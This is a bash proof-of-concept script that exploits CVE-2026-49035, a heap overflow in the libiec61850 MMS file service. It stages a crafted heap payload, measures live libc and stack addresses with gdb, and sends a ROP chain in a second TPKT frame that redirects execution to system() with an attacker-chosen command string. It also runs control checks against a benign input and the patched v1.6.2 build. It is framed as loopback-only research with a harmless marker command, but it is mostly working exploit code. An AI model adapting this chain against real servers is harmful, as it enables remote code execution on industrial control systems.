#!/usr/bin/env bash
# Bounded rung-5 experiment for CVE-2026-49035. Loopback only.
#   bash r5_system.sh <absolute-outdir>
#
# The witness-verified wire-supplied ROP chain from r4_real.sh is redirected
# from real libc write() to real libc system(). The command string is staged
# on the same stock server by the pinned ObtainFile path; the chain itself
# travels in a second loopback TPKT frame. gdb is used only to measure live
# ASLR-disabled addresses and observe the call; no debugger write supplies any
# execution byte and no LD_PRELOAD library is used. The command creates a
# unique marker file inside this plant's lab. This is NOT a claim of ASLR
# defeat, attacker-supplied code, persistence or general RCE.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/r5-system-out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

B="$OUT/build"
if [ ! -x "$B/plain/examples/server_example_files" ]; then
  rm -rf "$B"; mkdir -p "$B" || exit 2
  tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$B" || exit 2
  tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$B" || exit 2
  cmake -S "$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)" \
    -B "$B/plain" -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' > "$B/cmake.log" 2>&1 || exit 2
  cmake --build "$B/plain" --target server_example_files -- -j4 >> "$B/cmake.log" 2>&1 || exit 2
fi
if [ ! -d "$B/libiec61850-1.6.2" ]; then
  tar -xzf "$HERE/src/libiec61850-v1.6.2.tar.gz" -C "$B" || exit 2
fi
V=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)
F="$B/libiec61850-1.6.2"
P="$B/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce"
S="$B/plain/examples/server_example_files"
[ -n "$V" ] && [ -f "$P/rce/exploit.py" ] && [ -f "$P/poc/raw/exploit_raw.py" ] \
  && [ -x "$S" ] && [ -f "$P/poc/exploit_client.c" ] || exit 2
mkdir -p "$S/vmd-filestore"

MARKER="$HERE/r5_marker.txt"
CMD="printf R5_IEC_MARKER_49035 > $MARKER"
POP_RDI_OFF=0x10f84b
RET_OFF=0x10f84c
SYSTEM_OFF=0x58750

cat > "$OUT/stage.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pinned", sys.argv[1])
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
data = open(sys.argv[3], "rb").read()
print("stage_return=" + str(m.stage_file("127.0.0.1", int(sys.argv[2]), data, "REMOTE.BIN")))
PY

cp "$P/poc/raw/exploit_raw.py" "$OUT/exploit_two_msg.py" || exit 2
python3 - "$OUT/exploit_two_msg.py" <<'PY' || exit 2
import sys
path = sys.argv[1]
s = open(path).read()
needle = '        sock.sendall(file_read_frame)\n'
assert s.count(needle) == 1
add = needle + '''        # second, chosen TPKT frame: saved RBP then the wire-supplied chain
        import time
        time.sleep(3)
        second = bytes.fromhex('03000064') + open('CHAIN_PATH', 'rb').read()
        print(f"  [SEND] second TPKT frame {second.hex()}")
        sock.sendall(second)
        time.sleep(3)
        try:
            rb = sock.recv(128)
            print(f"  [READ] {rb.hex()}")
        except Exception as e:
            print(f"  [READ] no readback: {e}")
'''
open(path, 'w').write(s.replace(needle, add))
PY

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
          else echo "FAIL $1"; fail=$((fail+1)); fi; }
stop() { kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
sha() { sha256sum "$1" | cut -d' ' -f1; }
gone() { rm -f "$MARKER"; [ ! -e "$MARKER" ]; }

AP=10440; AT=10441; BP=10442; BT=10443; ST=10444; FT=10445
gone || exit 2

# Phase A: heap snapshot and this host's live addresses.
python3 -c "open('$OUT/initial.bin','wb').write(bytes(i%256 for i in range(120000)))" || exit 2
rm -f "$S/vmd-filestore/REMOTE.BIN"
( cd "$S" && timeout 20 ./server_example_files "$AP" ) > "$OUT/a.stage.server.log" 2>&1 &
srv=$!; sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$AP" "$OUT/initial.bin" > "$OUT/a.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/a.stage.client.log"
check "A: pinned ObtainFile staged the initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$S/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/initial.bin")" ]
check "A: staged file sha256 equals initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cat > "$OUT/a.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
set \$base = response->buffer
printf "=== BASE=%p ===\\n", \$base
printf "=== ADDR2 write=%p exit=%p system=%p ===\\n", &write, &exit, &system
dump binary memory $OUT/region-orig.bin \$base+19 \$base+19+120000
quit
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== RETSLOT=%p FD=%d ===\\n", \$rbp+8, self->socket->fd
continue
end
start
continue
GDB
( cd "$S" && timeout 25 gdb -q -batch -x "$OUT/a.gdb" --args ./server_example_files "$AT" \
    > "$OUT/a.gdb.log" 2>&1 ) &
gdbpid=$!; sleep 5
python3 "$P/poc/raw/exploit_raw.py" 127.0.0.1 "$AT" REMOTE.BIN 1 > "$OUT/a.client.log" 2>&1
sleep 1; stop "$gdbpid"

BASE=$(grep -o '=== BASE=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
RET=$(grep -o '=== RETSLOT=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
FD=$(grep -o 'FD=[0-9]*' "$OUT/a.gdb.log" | head -1 | cut -d= -f2)
A2=$(grep -o '=== ADDR2 write=0x[0-9a-f]* exit=0x[0-9a-f]* system=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1)
WRITE=$(echo "$A2" | grep -o 'write=0x[0-9a-f]*' | cut -d= -f2)
EXIT=$(echo "$A2" | grep -o 'exit=0x[0-9a-f]*' | cut -d= -f2)
SYSTEM=$(echo "$A2" | grep -o 'system=0x[0-9a-f]*' | cut -d= -f2)
[ -s "$OUT/region-orig.bin" ] && [ "$(stat -c%s "$OUT/region-orig.bin")" = 120000 ] \
  && [ -n "$BASE" ] && [ -n "$RET" ] && [ "$FD" = 4 ] && [ -n "$WRITE" ] \
  && [ -n "$EXIT" ] && [ -n "$SYSTEM" ]
check "A: heap snapshot and live base/ret/fd/write/exit/system measured" "$([ $? -eq 0 ] && echo 1 || echo 0)"

read LIBC POPRDI RETGAD SYSTEM_CALC <<<"$(python3 - "$WRITE" "$SYSTEM" <<'PY'
import sys
w = int(sys.argv[1], 16); s = int(sys.argv[2], 16)
libc = w - 0x11c7f0
assert s - libc == 0x58750, (hex(s-libc),)
print(hex(libc), hex(libc+0x10f84b), hex(libc+0x10f84c), hex(s))
PY
)"
echo "MEASURED base=$BASE ret=$RET fd=$FD libc=$LIBC write=$WRITE exit=$EXIT system=$SYSTEM cmd=$CMD" \
  | tee "$OUT/measured.txt"

# Phase B: stage the fake readBuffer plus the NUL-terminated command string.
cat > "$OUT/mkr5.py" <<'PY'
import struct, sys, hashlib
base = int(sys.argv[1], 16); ret = int(sys.argv[2], 16)
libc = int(sys.argv[3], 16); system = int(sys.argv[4], 16)
exit_ = int(sys.argv[5], 16); cmd = sys.argv[6].encode()
region, out, chainout = sys.argv[7], sys.argv[8], sys.argv[9]
p = bytearray(open(region, 'rb').read()); assert len(p) == 120000
def fi(addr): return addr - base - 19
def put(addr, fmt, val): p[fi(addr):fi(addr)+struct.calcsize(fmt)] = struct.pack(fmt, val)
cotp = base + 81648
f3 = base + 105000
msg = base + 106000 + 0x200
put(cotp + 0x40, '<Q', f3)      # CotpConnection->readBuffer
put(f3, '<Q', ret - 4)          # fake ByteBuffer.buffer -> saved RBP/ret
put(f3 + 8, '<i', 4096)
put(f3 + 12, '<i', 0)
assert len(cmd) < 256
p[fi(msg):fi(msg)+len(cmd)+1] = cmd + b'\0'
# pop rdi; ret  |  cmd  |  bare ret (ABI alignment)  |  system  |  exit
chain = b''.join(struct.pack('<Q', v) for v in (
    libc + 0x10f84b, msg, libc + 0x10f84c, system, exit_))
assert len(chain) == 40
open(chainout, 'wb').write(chain.ljust(96, b'\0'))
open(out, 'wb').write(p)
print('payload_sha256=' + hashlib.sha256(p).hexdigest())
print('cmd_hex=' + cmd.hex())
print('cmd_addr=' + hex(msg))
PY
python3 "$OUT/mkr5.py" "$BASE" "$RET" "$LIBC" "$SYSTEM" "$EXIT" "$CMD" \
  "$OUT/region-orig.bin" "$OUT/r5.bin" "$OUT/chain.bin" > "$OUT/r5.payload.log" || exit 2
HASH=$(grep -o 'payload_sha256=[0-9a-f]*' "$OUT/r5.payload.log" | cut -d= -f2)
CMDHEX=$(grep -o 'cmd_hex=[0-9a-f]*' "$OUT/r5.payload.log" | cut -d= -f2)
[ -n "$HASH" ] && [ -n "$CMDHEX" ]
check "B: crafted payload digest and command bytes recorded" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cp "$OUT/exploit_two_msg.py" "$OUT/exploit_r5.py"
python3 - "$OUT/exploit_r5.py" "$OUT/chain.bin" <<'PY' || exit 2
import sys
p = sys.argv[1]; s = open(p).read()
assert s.count('CHAIN_PATH') == 1
open(p, 'w').write(s.replace('CHAIN_PATH', sys.argv[2]))
PY

rm -f "$MARKER" "$S/vmd-filestore/REMOTE.BIN"
( cd "$S" && timeout 20 ./server_example_files "$BP" ) > "$OUT/b.stage.server.log" 2>&1 &
srv=$!; sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$BP" "$OUT/r5.bin" > "$OUT/b.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/b.stage.client.log"
check "B: pinned ObtainFile staged the crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$S/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/r5.bin")" ]
check "B: staged file sha256 equals crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cat > "$OUT/b.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
printf "=== B BASE=%p ===\\n", response->buffer
continue
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== READBUF rb=%p buf=%p fd=%d ===\\n", self->readBuffer, self->readBuffer->buffer, self->socket->fd
continue
end
GDB
cat > "$OUT/b.post.gdb" <<GDB
break *$SYSTEM
commands
silent
printf "=== SYSTEM hit rip=%p rdi=%p str=%s ===\\n", \$rip, \$rdi, (char *)\$rdi
continue
end
continue
GDB
( cd "$S" && timeout 30 gdb -q -batch -x "$OUT/b.gdb" -ex start -x "$OUT/b.post.gdb" \
    --args ./server_example_files "$BT" > "$OUT/b.gdb.log" 2>&1 ) &
gdbpid=$!; sleep 5
python3 "$OUT/exploit_r5.py" 127.0.0.1 "$BT" REMOTE.BIN 1 > "$OUT/b.client.log" 2>&1
sleep 3; stop "$gdbpid"

grep -q "=== B BASE=$BASE ===" "$OUT/b.gdb.log"
check "B: asserted overflow parameters in live server" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== READBUF rb=0x[0-9a-f]* buf=$(python3 -c "print(hex($RET-4))") fd=4 ===" "$OUT/b.gdb.log"
check "B: live readBuffer is the chosen saved-RBP/ret slot" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== SYSTEM hit rip=$SYSTEM " "$OUT/b.gdb.log"
check "B: live return reached real libc system()" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -qF "$CMD" "$OUT/b.gdb.log"
check "B: system() argument is the staged command string" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ -f "$MARKER" ] && grep -q 'R5_IEC_MARKER_49035' "$MARKER"
cp "$MARKER" "$OUT/marker.txt"
check "B: target process created the lab marker" "$([ $? -eq 0 ] && echo 1 || echo 0)"
! grep -q 'LD_PRELOAD' "$OUT/b.gdb.log"
check "B: no injected library code in server environment" "$([ $? -eq 0 ] && echo 1 || echo 0)"

# Control 1: safe input on the same vulnerable build (benign staged file).
gone || exit 2
rm -f "$S/vmd-filestore/REMOTE.BIN"
( cd "$S" && timeout 20 ./server_example_files "$ST" ) > "$OUT/s.stage.server.log" 2>&1 &
srv=$!; sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$ST" "$OUT/initial.bin" > "$OUT/s.stage.client.log" 2>&1
stop "$srv"
( cd "$S" && timeout 20 ./server_example_files $((ST+1)) ) > "$OUT/s.server.log" 2>&1 &
srv=$!; sleep 3
python3 "$OUT/exploit_r5.py" 127.0.0.1 $((ST+1)) REMOTE.BIN 1 > "$OUT/s.client.log" 2>&1
sleep 2; stop "$srv"
[ ! -e "$MARKER" ]
check "C: safe input on vulnerable build leaves marker absent" "$([ $? -eq 0 ] && echo 1 || echo 0)"

# Control 2: released v1.6.2 with the pinned conforming client.
if [ ! -x "$B/fixed/examples/server_example_files" ]; then
  cmake -S "$F" -B "$B/fixed" -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' > "$OUT/fixed.cmake.log" 2>&1 || exit 2
  cmake --build "$B/fixed" --target server_example_files -- -j4 >> "$OUT/fixed.cmake.log" 2>&1 || exit 2
fi
D="$B/fixed/examples/server_example_files"; mkdir -p "$D/vmd-filestore"
INC="-I$F/src/mms/inc -I$F/hal/inc -I$F/src/common/inc -I$F/src/iso_common/inc -I$F/hal/linux -I$F/config"
gcc -g -O0 $INC "$P/poc/exploit_client.c" \
  "$B/fixed/src/libiec61850.a" "$B/fixed/hal/libhal.a" \
  -lpthread -lm -o "$OUT/conforming_client" > "$OUT/client.compile.log" 2>&1 || exit 2
gone || exit 2
( cd "$D" && timeout 20 ./server_example_files "$FT" ) > "$OUT/f.server.log" 2>&1 &
srv=$!; sleep 3
timeout 15 "$OUT/conforming_client" 127.0.0.1 "$FT" > "$OUT/f.client.log" 2>&1
C=$?; sleep 2; stop "$srv"
grep -q 'MmsConnection_connect() failed' "$OUT/f.client.log"
check "C: conforming client stops on fixed-build AARE failure rc=$C" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ ! -e "$MARKER" ]
check "C: fixed build leaves marker absent" "$([ $? -eq 0 ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
